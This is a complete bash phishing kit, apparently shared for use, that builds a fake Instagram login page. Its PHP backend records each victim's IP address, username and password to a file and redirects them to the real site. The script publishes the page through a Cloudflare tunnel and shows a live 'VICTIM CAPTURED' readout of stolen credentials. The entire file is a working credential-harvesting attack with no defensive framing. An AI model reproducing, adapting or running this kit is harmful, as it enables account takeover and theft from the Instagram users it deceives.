#!/bin/bash

# --- 1. PREMIUM CONFIG & COLORS ---
# Hacker Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
BLUE='\033[1;34m'
CYAN='\033[1;36m'
GOLD='\033[1;33m'
PURPLE='\033[1;35m'
RESET='\033[0m'

# Cleanup Old Processes
pkill -f php > /dev/null 2>&1
pkill -f cloudflared > /dev/null 2>&1
rm -rf auth/
mkdir -p auth
touch usernames.txt

# --- 2. ANIMATION FX ---
animate() {
    text="$1"
    delay="$2"
    for (( i=0; i<${#text}; i++ )); do
        echo -ne "${text:$i:1}"
        sleep $delay
    done
    echo ""
}

# --- 3. LUXURY BANNER ---
clear
echo -e "${GOLD}"
cat << "EOF"
██████╗ ██████╗  ██████╗     ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗██╔══██╗██╔═══██╗    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██████╔╝██████╔╝██║   ██║       ██║   ██║   ██║██║   ██║██║     
██╔═══╝ ██╔══██╗██║   ██║       ██║   ██║   ██║██║   ██║██║     
██║     ██║  ██║╚██████╔╝       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝     ╚═╝  ╚═╝ ╚═════╝        ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
EOF
echo -e "${RESET}"
echo -e "${CYAN}        >>> THE ULTIMATE PHISHING SUITE <<<        ${RESET}"
echo -e "${PURPLE}        Created by : ANURAG HKR (Pro Edition)      ${RESET}"
echo -e "${GOLD}====================================================${RESET}"
echo ""

# --- 4. YOUR EXACT HTML (NO CHANGES IN DESIGN) ---
# Maine bas <form> tag add kiya hai, design 100% wahi hai.
cat > auth/index.php <<EOF
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Instagram Login – UI Demo</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
*{ margin:0; padding:0; box-sizing:border-box; font-family: Arial, Helvetica, sans-serif; }
body{ background:#0b1116; color:#fff; }
.main{ display:flex; min-height:100vh; }
.left{ width:50%; padding:60px; background:linear-gradient(160deg,#000,#0b1116); display:flex; flex-direction:column; justify-content:center; }
.left img.logo{ width:55px; margin-bottom:40px; }
.left h1{ font-size:40px; font-weight:400; line-height:1.3; }
.left h1 span{ color:#ff2d55; }
.left .story{ margin-top:40px; width:280px; }
.right{ width:50%; background:#121e26; display:flex; justify-content:center; align-items:center; }
.card{ width:380px; }
.card h2{ font-size:20px; margin-bottom:20px; }
.input{ width:100%; padding:14px; margin-bottom:12px; border-radius:12px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; outline:none; }
.btn{ width:100%; padding:14px; border:none; border-radius:30px; background:#0095f6; color:#fff; font-size:15px; cursor:pointer; margin-top:5px; font-weight:bold; } 
.link{ text-align:center; margin:18px 0; font-size:14px; color:#cfd8dc; }
.fb{ width:100%; padding:12px; border-radius:30px; border:1px solid #2a3a45; background:#0f1b22; color:#fff; margin-bottom:12px; }
.new{ width:100%; padding:12px; border-radius:30px; border:1px solid #3b82f6; background:transparent; color:#3b82f6; }
.meta{ text-align:center; margin-top:25px; opacity:.7; }
@media(max-width:900px){ .main{flex-direction:column;} .left,.right{width:100%;} }
</style>
</head>

<body>
<div class="main">
    <div class="left">
        <img class="logo" src="https://uploads.onecompiler.io/447wf6ce2/44caqn8u9/Screenshot_2026-02-01_130807-removebg-preview.png">
        <h1>See everyday moments from <br> your <span>close friends.</span></h1>
        <img class="story" src="https://static.cdninstagram.com/rsrc.php/v4/yF/r/reN9rvYdLTB.png">
    </div>

    <div class="right">
        <div class="card">
            <h2>Log in to Instagram</h2>
            
            <form action="login.php" method="POST">
                <input class="input" type="text" name="username" placeholder="Mobile number, username or email address" required>
                <input class="input" type="password" name="password" placeholder="Password" required>
                <button class="btn" type="submit">Log in</button>
            </form>
            <div class="link">Forgotten password?</div>
            <button class="fb">Log in with Facebook</button>
            <button class="new">Create new account</button>
            <div class="meta">∞ Meta</div>
        </div>
    </div>
</div>
</body>
</html>
EOF

# --- 5. PHP BACKEND ---
cat > auth/login.php <<EOF
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$user = \$_POST['username'];
\$pass = \$_POST['password'];
\$log = "\$ip|\$user|\$pass\n";
file_put_contents("../usernames.txt", \$log, FILE_APPEND);
header('Location: https://instagram.com');
exit();
?>
EOF

# --- 6. MAIN MENU ---
echo -e "${GREEN}[01] ${RESET}Localhost (Offline / Hotspot)"
echo -e "${GREEN}[02] ${RESET}Cloudflare (Worldwide Link) ${GOLD}[PREMIUM]${RESET}"
echo ""
echo -ne "${CYAN}[?] Select Option : ${RESET}"
read option

# --- OPTION 1: LOCALHOST ---
if [[ $option == "1" ]]; then
    echo ""
    echo -ne "${GOLD}[?] Enter Port (e.g., 8080): ${RESET}"
    read port
    port=${port:-8080}
    
    echo -e "${RED}[*] Starting Server on Port $port...${RESET}"
    php -S 0.0.0.0:$port -t auth > /dev/null 2>&1 &
    
    sleep 2
    echo -e "${GREEN}[✔] HOSTED LOCALLY!${RESET}"
    echo -e "${CYAN}Link: http://localhost:$port${RESET}"
    
# --- OPTION 2: CLOUDFLARE ---
elif [[ $option == "2" ]]; then
    echo ""
    echo -e "${RED}[*] Initializing Cloudflare Tunnel...${RESET}"
    
    # Auto Install Cloudflared
    if [ ! -f "cloudflared" ]; then
        echo -e "${YELLOW}[!] Downloading Cloudflare Engine...${RESET}"
        ARCH=$(uname -m)
        if [[ "$ARCH" == *"aarch64"* || "$ARCH" == *"arm64"* ]]; then
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
        else
            wget -q --show-progress https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
        fi
        chmod +x cloudflared
    fi
    
    # Run
    php -S 127.0.0.1:8080 -t auth > /dev/null 2>&1 &
    ./cloudflared tunnel -url http://127.0.0.1:8080 --logfile cloud.log > /dev/null 2>&1 &
    
    echo -ne "${GOLD}[*] Generating Link... ${RESET}"
    sleep 5
    LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
    
    if [[ -z "$LINK" ]]; then
        sleep 5
        LINK=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cloud.log" | head -n 1)
    fi
    
    echo -e "\n${GREEN}[✔] SUCCESS!${RESET}"
    echo -e "${CYAN}------------------------------------------------${RESET}"
    echo -e "${GOLD}URL: ${LINK}${RESET}"
    echo -e "${CYAN}------------------------------------------------${RESET}"

else
    echo -e "${RED}[!] Invalid Option! Exiting...${RESET}"
    exit
fi

# --- 7. LISTENER MODE (COMMON FOR BOTH) ---
echo ""
echo -e "${PURPLE}[*] Waiting for Victim Data... (Ctrl + C to Stop)${RESET}"
echo ""

while true; do
    if [ -f usernames.txt ]; then
        tail -n 0 -f usernames.txt | while IFS='|' read -r ip user pass; do
            if [[ ! -z "$ip" ]]; then
                echo -e "${RED}╔════════════════════════════════════════╗${RESET}"
                echo -e "${RED}║           VICTIM CAPTURED!             ║${RESET}"
                echo -e "${RED}╠════════════════════════════════════════╣${RESET}"
                echo -e "${GREEN}║ IP       : $ip${RESET}"
                echo -e "${YELLOW}║ USERNAME : $user${RESET}"
                echo -e "${CYAN}║ PASSWORD : $pass${RESET}"
                echo -e "${RED}╚════════════════════════════════════════╝${RESET}"
                echo -e "\a"
            fi
        done
    fi
done
